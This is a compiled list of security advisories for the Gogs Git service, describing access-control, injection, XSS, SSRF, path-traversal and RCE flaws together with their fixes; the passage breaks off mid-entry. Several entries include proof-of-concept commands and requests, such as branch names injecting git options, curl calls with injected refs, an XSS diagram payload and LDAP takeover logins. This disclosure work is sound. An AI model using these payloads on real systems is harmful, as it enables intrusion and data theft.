Gogs is an open source self-hosted Git service. Prior to 0.14.3, GET /attachments/:uuid returns the raw attachment file without verifying whether the requester has view permission for the associated Issue/Comment/Release or the repository.
In a test environment with REQUIRE_SIGNIN_VIEW = false, we confirmed that an unauthenticated user can download attachments belonging to a private repository. This vulnerability is fixed in 0.14.3.

CVE-2026-52800.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52800.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, organization team member management can be performed via GET requests without CSRF protection. If a victim who is an organization owner is logged in and is tricked into visiting a crafted link, an attacker-controlled user can be added to the Owners team. As a result, the attacker gains organization owner–equivalent privileges. This vulnerability is fixed in 0.14.3.

CVE-2026-52801.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52801.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Gogs Mirror Settings functionality provide an alternative way from the well protected New Migration functionality for any authenticated users to import local repositories. This issue stems from a lack of validation of SaveAddress function. This vulnerability is fixed in 0.14.3.

CVE-2026-52802.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52802.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, an open redirect vulnerability exists in Gogs where attacker-controlled redirect_to parameters can bypass validation, allowing redirection to arbitrary external sites. All redirects in Gogs that are validated via the IsSameSite function are vulnerable. The function only inspects the first two characters of the URL string. This check fails to account for directory traversal sequences followed by backslashes. This vulnerability is fixed in 0.14.3.

CVE-2026-52803.title: Gogs is an open source self-hosted Git service. Prior to 0.15.0,  ...
CVE-2026-52803.description: Gogs is an open source self-hosted Git service. Prior to 0.15.0, Gogs does not regenerate the session ID after successful authentication. An attacker who forces a victim to use a known session ID can hijack the session after the victim logs in and take over the account. This issue is fixed in version 0.15.0.

CVE-2026-52804.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52804.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, a repository admin collaborator can escalate their privileges to owner-level access by exploiting an off-by-one error in the ChangeCollaborationAccessMode function. This vulnerability is fixed in 0.14.3.

CVE-2026-52805.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52805.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, a Server-Side Request Forgery (SSRF) vulnerability exists in the repository migration functionality. The application validates only the initially submitted URL hostname, but git clone --mirror follows HTTP redirects. An authenticated user can submit a public URL that redirects to a blocked internal endpoint (e.g., 127.0.0.1), importing the internal repository's contents into an attacker-controlled repository. This vulnerability is fixed in 0.14.3.

CVE-2026-52806.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52806.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Gogs allows authenticated users to achieve Remote Code Execution (RCE) on the server by creating a pull request with a specially crafted branch name that injects the --exec flag into the git rebase command during the "Rebase before merging" merge operation. This vulnerability is fixed in 0.14.3.

CVE-2026-52807.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52807.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, in new_form.tmpl, milestone names are rendered with Go's default auto-escaping ({{.Name}}), which converts < to < etc. This prevents direct HTML injection. However, when the browser renders the DOM, the text content of the element contains the decoded original payload. Semantic UI 2.4.2's dropdown component has preserveHTML: true as the default setting. When a user selects a dropdown item, the internal set.text() method calls jQuery's .html() with the item's text content. This re-parses the decoded text as HTML, creating the injected element and triggering the JavaScript event handler. An attacker can store an HTML/JavaScript payload in a milestone name, and when any user opens the New Issue page and interacts with the milestone dropdown, the payload executes in their browser via Semantic UI's preserveHTML behavior. This vulnerability is fixed in 0.14.3.

CVE-2026-52808.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52808.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, three API endpoints — PATCH /api/v1/repos/:owner/:repo/issue-tracker, PATCH /api/v1/repos/:owner/:repo/wiki, and POST /api/v1/repos/:owner/:repo/mirror-sync — are gated by reqRepoWriter() rather than reqRepoAdmin(). The equivalent operations in the web UI sit behind reqRepoAdmin, which requires AccessMode >= AccessModeAdmin. A write-level collaborator (who has AccessMode == AccessModeWrite < AccessModeAdmin) can therefore call these API endpoints directly to disable the native issue tracker or wiki, inject attacker-controlled external tracker/wiki URLs that redirect all repository visitors, or trigger mirror sync — none of which they are authorized to do. This vulnerability is fixed in 0.14.3.

CVE-2026-52809.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52809.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, password-reset tokens are generated using conf.Auth.ActivateCodeLives (the account-activation lifetime), not conf.Auth.ResetPasswordCodeLives. The token lifetime is baked into the token itself at generation time and is re-extracted from the token at verification time, making RESET_PASSWORD_CODE_LIVES irrelevant to actual enforcement. When an administrator configures a shorter reset window (e.g., 10 minutes) for compliance or security reasons, reset tokens remain exploitable for the full activation lifetime instead, while the reset email falsely advertises the shorter expiry. This vulnerability is fixed in 0.14.3.

CVE-2026-52810.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52810.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Git smart HTTP authorizes POST …/git-receive-pack using the client-supplied service query string (so ?service=git-upload-pack is evaluated as read access) while routing still runs git receive-pack, allowing push where only read should be allowed. This vulnerability is fixed in 0.14.3.

CVE-2026-52811.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52811.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, (*Repository).UploadRepoFiles checks for symlinks only on the leaf of the upload target (osx.IsSymlink(targetPath)). The siblings UpdateRepoFile, DeleteRepoFile, and GetDiffPreview use hasSymlinkInPath, which lstats every component — UploadRepoFiles is the lone outlier. An attacker with repo-write access plus a multipart upload whose filename contains a literal backslash (preserved by filepath.Base on Linux, then converted to / by pathx.Clean) redirects the write through a previously-committed directory symlink. iox.CopyFile opens the destination with os.Create (no O_NOFOLLOW), so the kernel follows the parent symlink and writes attacker bytes anywhere the gogs UID can write — ~git/.ssh/authorized_keys → SSH foothold, or <repo>.git/hooks/post-receive → next-push RCE. This vulnerability is fixed in 0.14.3.

CVE-2026-52812.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52812.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Git LFS storage is content-addressed by OID alone (<LFS-root>/<oid[0]>/<oid[1]>/<oid>) but per-repo authorization lives in the lfs_object table keyed (repo_id, oid). serveUpload skips re-uploading when the OID file already exists on disk and inserts a new (repo_id, oid) row pointing at it without verifying the request body hashes to the OID being claimed. Any user with write access to one repo can bind their repo to an OID owned by a private repo and download the original bytes via their own download endpoint. This vulnerability is fixed in 0.14.3.

CVE-2026-52813.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52813.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, organization names containing path traversal sequences (../) are accepted by Gogs, and repositories under them are written to paths following these path traversals. This allows storing/retrieving data for repositories at arbitrary locations on the filesystem. By creating nested structure of Git repositories, one can overwrite the other's hooks configuration to result in Remote Code Execution (RCE). This vulnerability is fixed in 0.14.3.

CVE-2026-52814.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52814.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Gogs built-in Go SSH server is vulnerable to an unauthenticated, asymmetric Denial of Service (DoS) attack. The application accepts inbound TCP connections and passes them to golang.org/x/crypto/ssh.NewServerConn inside a new goroutine without enforcing any read/write deadlines on the underlying net.Conn. An unauthenticated attacker can open multiple TCP connections to the SSH port and simply withhold the SSH protocol banner. This forces the server to spawn an unbounded number of goroutines that block indefinitely waiting for socket I/O. This leads to complete File Descriptor (FD) exhaustion, preventing legitimate users from accessing the Git SSH service, and ultimately destabilizing the entire Gogs process (e.g., causing internal log rotation failures). This vulnerability is fixed in 0.14.3.

CVE-2026-52815.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52815.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, Gogs has an unauthenticated information disclosure vulnerability. The GET /api/v1/orgs/:orgname/teams endpoint at internal/route/api/v1/org_team.go:8 returns all teams for any organization without requiring authentication. The route group at internal/route/api/v1/api.go:380-385 lacks the reqToken() middleware, and the listTeams() handler performs no authentication check, exposing team IDs, names, descriptions, and permission levels to any unauthenticated caller. This vulnerability is fixed in 0.14.3.

CVE-2026-52816.title: Gogs is an open source self-hosted Git service. Prior to 0.14.3,  ...
CVE-2026-52816.description: Gogs is an open source self-hosted Git service. Prior to 0.14.3, the Jupyter Notebook (ipynb) sanitizer endpoint at POST /-/api/sanitize_ipynb allows arbitrary data: URIs without proper restrictions, potentially leading to Cross-Site Scripting (XSS). The endpoint uses bluemonday.UGCPolicy() with p.AllowURLSchemes("data") which permits all data URI schemes including data:text/html, enabling attackers to inject malicious HTML/JavaScript. Additionally, the endpoint has no authentication middleware, allowing any registered user to exploit this vulnerability. This vulnerability is fixed in 0.14.3.

CVE-2026-77918.title: Gogs through 0.14.4 contains an information disclosure vulnerabil ...
CVE-2026-77918.description: Gogs through 0.14.4 contains an information disclosure vulnerability that allows authenticated users to view private forks by querying fork listings without per-fork read checks. Attackers with read access to a private base repository can call GET /api/v1/repos/{owner}/{repo}/forks or the Forks web handler to obtain other users' private fork owners, names, descriptions and clone URLs.

CVE-2026-82401.title: Arbitrary file write via git diff --output argument injection in DiffBinary
CVE-2026-82401.description: ## Summary The `DiffBinary()` function in gogs/git-module passes user-controlled branch names to `git diff --full-index --binary <base> <head>` without `--end-of-options`. An attacker who pushes a branch named `--output=/path/to/target` can trigger arbitrary file writes on the server by creating a pull request. ## Details ### Root Cause `git-module/repo_diff.go:163-173` constructs the diff command as: ```go cmd := NewCommand('diff', '--full-index', '--binary', base, head) ``` When `head = '--output=/path/to/target'`, git interprets it as the `--output` option, writing diff content to an attacker-specified path. ### Data Flow 1. Attacker pushes branch named `--output=/tmp/pwned` via: `git update-ref 'refs/heads/--output=/tmp/pwned' HEAD && git push origin 'refs/heads/--output=/tmp/pwned'` 2. Attacker creates PR via compare URL: `/:owner/:repo/compare/main...--output=/tmp/pwned` 3. `ParseCompareInfo` at `route/repo/pull.go:462,470` parses `headRef = '--output=/tmp/pwned'` from URL 4. `RevParse('--output=/tmp/pwned')` at line 532 — succeeds (git rev-parse doesn't recognize `--output` as its own option, exits 0) 5. `MergeBase` with `--end-of-options` at line 664 — resolves the branch ref to a commit hash, succeeds 6. `headGitRepo.DiffBinary(meta.MergeBase, '--output=/tmp/pwned')` at line 716 7. Executes: `git diff --full-index --binary <hash> --output=/tmp/pwned` 8. Git writes the diff output to `/tmp/pwned` ### Why Gogs Doesn't Block This - **Branch name validation:** Gogs has NO branch name validation during push. The pre-receive hook checks only that the refname is non-empty. - **`git check-ref-format`:** Accepts `=` and `--` prefix in ref names. `--output=/tmp/pwned` is a valid git refname. - **`RevParse` is not a guard:** `git rev-parse` echoes unrecognized `--` flags back without error (exit 0), so it passes for malicious inputs. - **`MergeBase` has `--end-of-options`:** But this only protects the merge-base command itself — it correctly resolves the branch as a revision. The vulnerable `DiffBinary` call comes AFTER. ### Relationship to Existing Fixes GHSA-qf6p-p7ww-cwr9 added `--end-of-options` to `git rebase`, `git merge`, `git checkout`, and `git push` in `internal/database/pull.go`. The `git diff` command in `git-module/repo_diff.go:DiffBinary()` was NOT included in this fix. GHSA-cf29-q2mc-vf3j covers `git checkout` in git-module — this is a different function (`DiffBinary`) with a different primitive (file write vs flag injection). ## Impact - **Arbitrary file write** on server filesystem (any path writable by Gogs process user) - Content is partially attacker-controlled (git diff format — attacker controls file content in commits) - Requires authenticated user with write access to push branch + create PR - File content starts with `diff --git a/...` header, limiting direct RCE (not a valid script/key format) - Can overwrite/corrupt server files (DoS), or write to paths with loose format requirements ## Reproduction ```bash # As repo owner/collaborator: git update-ref 'refs/heads/--output=/tmp/gogs_pwned' HEAD git push origin 'refs/heads/--output=/tmp/gogs_pwned:refs/heads/--output=/tmp/gogs_pwned' # Create PR (or just visit compare URL): curl -X POST 'http://gogs:3000/user/repo/compare/main...--output=/tmp/gogs_pwned' \ -H 'Cookie: <session>' \ -d 'title=test' # Verify: ls -la /tmp/gogs_pwned # File exists with diff content ``` ## Recommended Fix Add `--end-of-options` before positional arguments in `DiffBinary()`: ```go cmd := NewCommand('diff', '--full-index', '--binary', '--end-of-options', base, head) ``` Also apply to `Pull()`, `Reset()`, and `RevParse()` in git-module for defense-in-depth.

CVE-2026-84362.title: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') in gogs.io/gogs
CVE-2026-84362.description: ### Summary Multiple Gogs API endpoints pass user-controlled input to `git rev-parse` without the `--end-of-options` separator. An authenticated user can inject git CLI options like `--absolute-git-dir` through parameters meant for commit SHAs or branch references, leaking the server's full filesystem path to the repository and other internal configuration details to the server-side error logs. ### Details The `RevParse` function in `gogs/git-module` (v1.8.8) at `repo.go:590-607` constructs a git command without `--end-of-options`: ```go func (r *Repository) RevParse(rev string, opts ...RevParseOptions) (string, error) { cmd := NewCommand('rev-parse').AddOptions(opt.CommandOptions) stdout, err := cmd.AddArgs(rev).RunInDirWithTimeout(opt.Timeout, r.path) // ... } ``` Other functions in the same library correctly use `--end-of-options` (e.g., `DeleteBranch` at `repo_reference.go:284`, `MergeBase` at `repo_pull.go:36`, `ShowRefVerify` at `repo_reference.go:59`), showing the developers are aware of this pattern but missed it in `RevParse`. `RevParse` is called by `CatFileCommit` (`repo_commit.go:98`), which is reachable from these API endpoints: - `GET /api/v1/repos/:owner/:repo/contents?ref=PAYLOAD` - `PUT /api/v1/repos/:owner/:repo/contents/*` (branch field in request body) - `GET /api/v1/repos/:owner/:repo/git/trees/:sha` - `GET /api/v1/repos/:owner/:repo/git/blobs/:sha` - `GET /api/v1/repos/:owner/:repo/commits/:sha` - `GET /api/v1/repos/:owner/:repo/raw/*` (via RepoRef middleware) This is the same vulnerability class as CVE-2024-39933 (git argument injection via tag names), where the fix was to strip leading dashes. The `RevParse` function was not addressed in that fix. ### PoC Tested on Gogs 0.15.0+dev (main branch), Linux. **Step 1: Inject --absolute-git-dir to leak the repository filesystem path** ```bash TOKEN='<your-api-token>' curl -s -H 'Authorization: token $TOKEN' \ 'http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--absolute-git-dir' ``` The API returns a generic error to the caller: ```json {'message':'Something went wrong, please check the server logs for more information.'} ``` But the server log records the full filesystem path: ``` [ERROR] NotFoundOrError() get commit: exit status 128 - fatal: Not a valid object name /data/gogs/repos/YOUR_USER/test-repo.git ``` **Step 2: Probe other internal details** ```bash # Confirm repository is bare curl -s -H 'Authorization: token $TOKEN' \ 'http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--is-bare-repository' # Server log: 'Not a valid object name true' # Get git common directory curl -s -H 'Authorization: token $TOKEN' \ 'http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--git-common-dir' # Server log: 'Not a valid object name .' ``` **Validated output from local test:** ``` [ERROR] get commit: exit status 128 - fatal: Not a valid object name /tmp/hunt-gogs/data/repos/testadmin/test-repo.git [ERROR] get commit: exit status 128 - fatal: Not a valid object name true [ERROR] get commit: exit status 128 - fatal: Not a valid object name . ``` The disclosed information (filesystem paths, repository type, directory layout) is written to server-side logs. The API response to the attacker is a generic error message. If the attacker has access to logs (shared log aggregation, another vulnerability, or admin access), the leaked paths reveal the full directory structure of the server. ### Impact This is a git argument injection that results in server-side information disclosure. An authenticated user with read access to any repository (including public repositories) can leak the server's internal filesystem paths and repository configuration to the error logs. The disclosed paths reveal the operating system layout, Gogs installation directory, data directory structure, and service account username. This information is useful for chaining with other vulnerabilities that require knowledge of absolute filesystem paths (path traversal, local file inclusion). The vulnerability follows the same pattern as CVE-2024-39933. While `rev-parse` does not support options that lead to code execution or file writes (limiting the direct impact), the missing `--end-of-options` separator is a defense-in-depth gap that should be fixed across all affected functions in the `git-module` library: `RevParse` (`repo.go:597`), `Checkout` (`repo.go:310`), and `CatFileType` (`repo_commit.go:144`).

GHSA-26gq-grmh-6xm6.title: Gogs vulnerable to Stored XSS via Mermaid diagrams
GHSA-26gq-grmh-6xm6.description: ### Summary Stored XSS via mermaid diagrams due to usage of vulnerable renderer library ### Details Gogs introduced support for rendering mermaid diagrams in version [0.13.0.](https://github.com/gogs/gogs/releases/tag/v0.13.0) Currently used version of the library [mermaid 11.9.0](https://github.com/gogs/gogs/tree/main/public/plugins/mermaid-11.9.0) is vulnerable to at least two XSS scenarios with publicly available payloads Resources: https://github.com/mermaid-js/mermaid/security/advisories/GHSA-7rqq-prvp-x9jh https://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw ### PoC 1. Create a markdown file eg. `README.md` containing following malicious mermaid diagram (payload based on [CVE-2025-54880](https://github.com/mermaid-js/mermaid/security/advisories/GHSA-8gwm-58g9-j8pw)) ``` architecture-beta group api(cloud)[API] service db "" [Database] in api ``` 2. The XSS should pop whenever either repository or file is viewed #### Demo https://github.com/user-attachments/assets/98320f62-6c1c-4254-aa61-95598c725235 ### Impact The attacker can potentially achieve account takeover In a worst case scenario if the victim were an instance admin this could lead to a compromise of the entire deployment ### Proposed remediation steps 1. Upgrade to a patched version of the third party library https://github.com/mermaid-js/mermaid/releases/tag/v10.9.5 2. Consider running mermaid using `sandbox` level which would mitigate impact of future potential cross-site scripting issues https://mermaid.js.org/config/usage.html#securitylevel

GHSA-53f6-cgcf-gp6v.title: Commit-message issue references post comments into private repositories the pusher cannot access
GHSA-53f6-cgcf-gp6v.description: ## Summary When commits are pushed, Gogs scans their messages for `owner/repo#N` references and adds a 'referenced this issue' comment to each referenced issue. It does this for any repository, including private ones the pusher has no access to. An attacker therefore pushes a commit to their own repository whose message references `victim/private-repo#1`, and a comment with attacker-controlled text and links appears in the victim's private issue. The response also confirms whether a private issue exists. Reproduced on `v0.14.3` and on `main` @ `dbbd717e`. ## Details `internal/database/actions.go`, `updateCommitReferencesToIssues`: - `GetIssueByRef(ref)` resolves an issue in any repository. - `CreateRefComment(doer, repo, issue, message, sha)` is then called with no permission check. The close and reopen keyword loops in the same function do limit themselves to `issue.RepoID == repo.ID`. ## Proof of concept Setup: alice owns the private repo `alice/secret` with issue #1. mallory has no access to it. All of these return 404 or non-200: - the issue through the API, - commenting on it through the API, - the issue in the web UI. mallory pushes to her own repository: ``` git commit -m 'alice/secret#1 Session expired, sign in again' git push ``` A comment by mallory then appears on `alice/secret#1`, containing the attacker's link, and alice's issue page renders the link. With the patch below, no comment is created. alice's own cross-repo reference to her issue still produces a comment. Executed on the official release binaries v0.13.0 (`gogs_0.13.0_linux_amd64.tar.gz`, sha256 `75da1c026cacb187a7c1dcad8263873ec566ce30cc0df56dd1dc129b8292d34f`) and v0.14.3 (`gogs_v0.14.3_linux_amd64.tar.gz`, sha256 `c27fbd8337ebd661929389f5237bf601e09958d514835c99fad3b904c63bedb2`), and on `main` @ `dbbd717e`. Cross-repository issue references are an intended feature; the problem is only that they are honoured for repositories the pusher cannot read. A self-contained script is available on request. ## Impact Anyone without access can write into private repositories' issues, which is useful for phishing repository members with links that appear inside their private tracker. It also reveals whether private issues exist. ### Remediation For references outside the pushed repository, require the pusher to have at least read access before creating the comment: ```go if issue.RepoID != repo.ID { refRepo, err := GetRepositoryByID(issue.RepoID) if err != nil { return err } if !Handle.Permissions().Authorize(context.TODO(), doer.ID, refRepo.ID, AccessModeRead, AccessModeOptions{OwnerID: refRepo.OwnerID, Private: refRepo.IsPrivate}) { continue } } ``` I would appreciate a CVE being requested for this issue. ### Credits Please credit as: Dylan McGuinness (GitHub @dylanzonix), Ambit Security (finder, reporter).

GHSA-7cvr-7cff-2mrg.title: LDAP login selects the local account by email while the directory identity is searched by uid: an unrelated directory entry whose uid attribute equals a victim's Gogs email authenticates as that account - including site admins
GHSA-7cvr-7cff-2mrg.description: # PVR Report - gogs/gogs - F-2177 ## Suggested title LDAP login selects the local account by email while the directory identity is searched by uid: an unrelated directory entry whose uid attribute equals a victim's Gogs email authenticates as that account - including site admins ## Affected package and versions - Repository: gogs/gogs - Product and version tested: Gogs v0.14.4, isolated same-tag instance (container i20265-gogs144, SQLite backend, http://127.0.0.1:3105) - Affected subcomponents: internal/database/users.go (the email-branch account selection in Authenticate), internal/auth/ldap/config.go (the uid-filter directory search), and every entry that funnels into them - the web login form POST /user/login, API Basic auth on /api/v1/*, and git smart-HTTP ## Suggested severity High - the attacker needs no victim credentials at all: a directory entry they control, whose uid attribute happens to be the victim's Gogs email string, plus their own directory password, yields the victim's full account, including site-admin accounts with instance-wide reach. ## Description ### Summary Two different string matchers decide one LDAP login in Gogs 0.14.4, and they do not have to agree on the same person. Account selection happens first, in the database layer: if the submitted login string contains an @, Gogs selects the local row with WHERE email = ?; otherwise it matches lower_name. Authentication happens second, in the LDAP layer: the provider searches the directory with the configured filter (uid=%s) for exactly one entry and binds with that entry's DN plus the submitted password. If the bind succeeds, Gogs returns the row it picked in step one. The directory entry that got authenticated and the local row that gets returned are never compared - there is no external id, and no check that they describe the same person. The consequence: any directory entry whose uid attribute contains another user's Gogs email (uid attributes in email or UPN form are a common enterprise convention) authenticates into that user's account. I verified this against a site-admin account: a zero-relation directory entry with uid=admin@corp logged in as the admin, with its session, its API Basic access and its git clone of a private repository all confirmed. The same mechanism worked for a non-admin victim account, and local accounts correctly rejected the mismatched login source. ### Preconditions 1. The instance has an LDAP authentication source configured (in my fixture, login_source id=1; account and directory are separate identities). 2. The directory contains an entry whose uid attribute is written in email or UPN form - a common enterprise convention - and that entry is controlled by the attacker (in my test: uid=victim@corp, or for the admin case uid=admin@corp, with the attacker holding that entry's password). 3. The victim is an existing account created through LDAP (user.login_source=1) whose Gogs email equals that uid string (for the admin case, the victim was the site admin gogsadm with email admin@corp.test). 4. The attacker holds no victim credentials and has no relationship to the victim. ### Steps to reproduce 1. Submit the login form as the attacker with the victim's email as the username and the attacker's directory password: POST /user/login with user_name=admin@corp, password=AtkPass#2026, login_source=1. 2. With the resulting session, open GET /admin and GET /admin/users to confirm admin reach, and read a private raw file: GET /gogsadm/priv/raw/master/SECRET.txt. 3. Repeat over API Basic: GET /api/v1/repos/gogsadm/priv with Basic admin@corp:AtkPass#2026. 4. Repeat over git: git clone http://admin%40corp:AtkPass%232026@127.0.0.1:3105/gogsadm/priv.git (credentials in URL form). 5. Run the same procedure with a non-admin victim: POST /user/login with user_name=victim@corp (an existing LDAP account, id=3) and the directory password of the entry holding that uid. 6. Control: try the same form against a local account (login_source=0, e.g. i20265root or root@i20265.test). 7. Control: try the web login with a wrong password. ### Observed evidence Verbatim measurements from my run: ``` POST /user/login user_name=admin@corp & password=AtkPass#2026 & login_source=1 -> 302 / GET /admin -> 200 GET /admin/users -> 200 GET /gogsadm/priv/raw/master/SECRET.txt -> 200 SECRET_I20265_PRIV_9f3a2c7d (session subject: gogsadm, id=2, is_admin=1) GET /api/v1/repos/gogsadm/priv (Basic admin@corp:AtkPass#2026) -> 200 (owner id=2, private=true) git clone with the same credentials -> rc=0 origin/master:SECRET.txt -> SECRET.txt (plaintext secret file content) uid=victim@corp -> logs in as the existing victim account (id=3) wrong password on the web login -> 401 wrong password on git -> rc=128 local account + login_source=1 (i20265root / root@i20265.test) -> 422 (auth source mismatch - the login_source check works) ``` ### Root cause 1. internal/database/users.go:65-73 - Authenticate lowercases the submitted login; if it contains an @, the account row is selected with WHERE email = ? (otherwise lower_name = ?). This is the account that will be returned on success. 2. :82-89 - the only additional condition is that the row's numeric login_source equals the selected source id; email equality with any directory attribute is never required. 3. :96-120 - for a non-local source, the code calls source.Provider.Authenticate(login, password) with the same submitted string. internal/auth/ldap/config.go:108-151 searches the directory with the configured filter ((uid=%s)) and requires exactly one entry, then binds with that entry's DN plus the submitted password (:223-229, :332-338). If the bind succeeds, :120 returns the database row selected earlier by email. The directory entry that was authenticated and the local row that is returned are never compared; there is no external_id column and no binding table in the schema. 4. The entry points all funnel into the same two matchers: the web login form, API Basic auth on /api/v1/*, and git smart-HTTP. ### Impact A zero-relation directory entry takes over any account whose login_source is the LDAP source and whose email appears as some entry's uid attribute. In my measurement that included a site-admin account, with its admin panel, its private repositories over raw, API Basic and git, and therefore the ability to administer the instance. The mechanism is generic for any LDAP account on the instance; the admin case is simply the highest-value instance of it. The impact spans identity confusion and cross-account access on every entry point that accepts the credentials. ### Suggested fix Make the row-selection key and the authentication key the same thing. After a successful LDAP bind, resolve the account through an immutable directory identifier - entryUUID, objectGUID or the entry DN - stored in a binding table (an external_id column with a unique index, or an external_login_user table keyed by login_source_id + external_id). On first binding, require a verified email match or an admin confirmation before attaching an existing account. Remove the 'contains @ implies email' selection branch for external sources; if email-form logins must be supported for LDAP accounts, verify that the IdP-returned identity (the found entry's canonical uid and its mail attribute) matches the local row before accepting the login. Add a regression test: a zero-relation entry whose uid equals a victim's email must fail to log in (401/422), on the web form, on Basic and on git. ## Notes for the maintainers I can provide the LDAP fixture (the directory tree, the Gogs login source configuration and the exact attribute values) to help you validate a fix. My internal rule mapping tags this as CWE-287 (improper authentication), CWE-639 (authorization bypass through user-controlled key) and CWE-863 (incorrect authorization). I would prefer coordinated disclosure with a 90-day timeline before public disclosure.

GHSA-85m5-cfw6-3cx8.title: Windows-only incomplete fix: ".git " (trailing space) bypasses isRepositoryGitPath -> write into .git/config -> RCE
GHSA-85m5-cfw6-3cx8.description: ## Summary An unmirrored sibling of the .git-path write protection that produced CVE-2025-8110. isRepositoryGitPath blocks the Windows trailing-DOT form '.git.' but not the trailing- SPACE form '.git '. On Windows, Win32 strips trailing spaces from a path component exactly as it strips trailing dots, so an authenticated user with repo write/push can write into the real .git/config -> set core.sshCommand -> RCE. Windows hosts only. ## Affected component - Repository: https://github.com/gogs/gogs - Version: HEAD b925c222959e57f3c403aebb6122fede6a1f35da (through v0.14.3) - File: internal/database/repo_editor.go:540-548 (isRepositoryGitPath) ## Root cause (HEAD) isRepositoryGitPath lower-cases the path and rejects: '.git', '.git/', '.git\', and the Windows trailing-dot forms '.git.', '.git./', '.git.\' It does NOT reject the trailing-space forms '.git ', '.git /', '.git \'. pathx.Clean preserves internal spaces, and hasSymlinkInPath does not fire (it is a literal directory, not a symlink), so a component '.git ' passes both guards. On Windows, the Win32 path layer strips trailing spaces from a path component (the same normalization that made '.git.' dangerous and prompted the existing dot handling). So an authenticated user who creates/edits a file at path '.git /config' causes os.WriteFile(path.Join(localPath, '.git /config')) to resolve to the real '.git/config' -> core.sshCommand -> RCE on the next git operation. Same class/impact as CVE-2025-8110. ## Reachability Authenticated user with write/push on a repo, via the web file editor (editor.go) and the API repo_contents PutContents path -> UpdateRepoFile. Windows deployments only (Linux treats '.git ' as a distinct directory; no normalization). ## Impact Authenticated -> remote code execution on Windows-hosted Gogs. CVSS 3.1 AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (~7.5). AC:H reflects the Windows-only precondition. ## Suggested fix Trim trailing spaces AND dots from each path component before the check, or add '.git ', '.git /', '.git \' to the blocklist, mirroring the existing '.git.' handling. ## Disclosure Coordinated disclosure no public disclosure until you've responded and shipped a fix.

GHSA-8r2x-49gj-h6rm.title: Protected Branch Bypass via Pull Request Merge Due to Missing Hook Environment Variables
GHSA-8r2x-49gj-h6rm.description: ### Summary The pull request merge operation in Gogs completely bypasses protected branch enforcement. When a pull request is merged through the web interface, the internal `git push` that writes the merge commit to the base repository runs without the `SSH_ORIGINAL_COMMAND` environment variable. The pre-receive hook checks for this variable at startup and immediately exits when it is absent, skipping all branch protection logic including whitelist enforcement, required pull request checks, and merge restrictions. Any collaborator with Write access can merge a pull request into any protected branch, regardless of whether they are in the push whitelist. ### Details The vulnerability spans three components that fail to connect properly: **1. MergePullRequest handler has no application-level protection check** The handler at `internal/route/repo/pull.go:401-431` only requires `reqRepoWriter` middleware. It never calls `GetProtectBranchOfRepoByName` to check whether the target branch is protected, nor does it verify whether the merging user is in the push whitelist: ```go func MergePullRequest(c *context.Context) { issue := checkPullInfo(c) if c.Written() { return } if issue.IsClosed { /* error */ return } pr := issue.PullRequest if !pr.CanAutoMerge() || pr.HasMerged { /* error */ return } // No protected branch check here pr.Merge(c.User, c.Repo.GitRepo, database.MergeStyle(c.Query('merge_style')), c.Query('commit_description')) } ``` **2. pr.Merge() calls git.Push without environment variables** The `Merge` function at `internal/database/pull.go:194-316` performs the merge in a temporary directory, then pushes the result to the base repository at line 314: ```go if err = git.Push(tmpBasePath, baseGitRepo.Path(), pr.BaseBranch); err != nil { return errors.Newf('git push: %v', err) } ``` This calls `git.Push` with no `PushOptions`, meaning no environment variables are passed to the git child process. Compare with the properly protected `UpdateRepoFile` function at `internal/database/repo_editor.go:226-239`, which passes `ComposeHookEnvs()` (setting `SSH_ORIGINAL_COMMAND=1` plus user/repo identification variables) to its push call. **3. The git-module Push function has no environment variable support** The `git.Push` function at `github.com/gogs/git-module@v1.8.8/repo.go:258-267`: ```go func Push(repoPath, remote, branch string, opts ...PushOptions) error { var opt PushOptions if len(opts) > 0 { opt = opts[0] } cmd := NewCommand('push').AddOptions(opt.CommandOptions).AddArgs('--end-of-options', remote, branch) _, err := cmd.RunInDirWithTimeout(opt.Timeout, repoPath) return err } ``` The `PushOptions` struct contains only `Timeout` and `CommandOptions` fields. There is no `Envs` field, so even if the caller wanted to pass environment variables, the function cannot accept them. **4. Pre-receive hook exits immediately without SSH_ORIGINAL_COMMAND** The pre-receive hook at `cmd/gogs/hook.go:63-66`: ```go func runHookPreReceive(_ context.Context, cmd *cli.Command) error { if 